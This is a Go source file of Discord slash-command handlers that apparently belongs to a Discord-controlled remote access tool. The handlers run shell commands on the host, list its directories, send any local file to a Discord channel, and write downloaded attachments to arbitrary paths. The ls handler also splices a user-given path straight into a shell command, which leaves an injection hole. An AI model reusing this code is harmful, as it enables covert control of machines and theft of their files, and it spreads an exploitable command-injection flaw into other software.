package main

// This file contains filesystem-related slash commands such as cwd, ls,
// download, and upload.

import (
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/bwmarrin/discordgo"
)

// handleSlashCwd runs a platform-appropriate command to show the current
// working directory for this client.
func handleSlashCwd(s *discordgo.Session, i *discordgo.InteractionCreate) {
	cmd := "pwd"
	if runtime.GOOS == "windows" {
		cmd = "cd"
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Running: `" + cmd + "`",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	runCommandString(s, i.ChannelID, nil, cmd)
}

// handleSlashLs lists a directory on the client, defaulting to the current
// working directory when no path is provided.
func handleSlashLs(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	var path string
	for _, opt := range data.Options {
		if opt.Name == "path" {
			path = opt.StringValue()
			break
		}
	}
	base := "ls"
	if runtime.GOOS == "windows" {
		base = "dir"
	}
	cmdStr := base
	if path != "" {
		cmdStr = base + " " + path
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Running: `" + cmdStr + "`",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	runCommandString(s, i.ChannelID, nil, cmdStr)
}

// handleSlashDownload streams a small local file back to Discord as an
// attachment, enforcing the 8MB upload limit.
func handleSlashDownload(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	var srcPath string
	for _, opt := range data.Options {
		if opt.Name == "source" {
			srcPath = opt.StringValue()
		}
	}
	if srcPath == "" {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "No source path provided.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	if strings.HasPrefix(srcPath, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			srcPath = home + string(os.PathSeparator) + srcPath[2:]
		}
	}
	f, err := os.Open(srcPath)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Cannot open file: " + srcPath + " (" + err.Error() + ")",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Cannot stat file: " + srcPath + " (" + err.Error() + ")",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	if fi.Size() >= 8388608 {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "File is bigger than 8MB 😔",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "📥 Downloading `" + filepath.Base(srcPath) + "`...",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	fileStruct := &discordgo.File{Name: filepath.Base(srcPath), Reader: f}
	fileArray := []*discordgo.File{fileStruct}
	s.ChannelMessageSendComplex(i.ChannelID, &discordgo.MessageSend{
		Files: fileArray,
	})
}

// handleSlashUpload downloads an attachment from Discord and writes it to a
// destination path on the client, expanding ~/ when present.
func handleSlashUpload(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	var destPath string
	var attachment *discordgo.MessageAttachment
	for _, opt := range data.Options {
		if opt.Name == "destination" {
			destPath = opt.StringValue()
		}
		if opt.Name == "source" {
			if data.Resolved != nil && data.Resolved.Attachments != nil {
				if id, ok := opt.Value.(string); ok {
					if a, ok := data.Resolved.Attachments[id]; ok {
						attachment = a
					}
				}
			}
		}
	}
	if destPath == "" || attachment == nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Source attachment and destination path are required.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	if strings.HasPrefix(destPath, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			destPath = home + string(os.PathSeparator) + destPath[2:]
		}
	}
	if info, err := os.Stat(destPath); err == nil && info.IsDir() {
		destPath = filepath.Join(destPath, attachment.Filename)
	}
	out, err := os.Create(destPath)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Cannot create file: " + destPath + " (" + err.Error() + ")",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	defer out.Close()
	resp, err := http.Get(attachment.URL)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Download failed: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	defer resp.Body.Close()
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Write failed: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "☝️ Uploaded file to " + destPath,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}
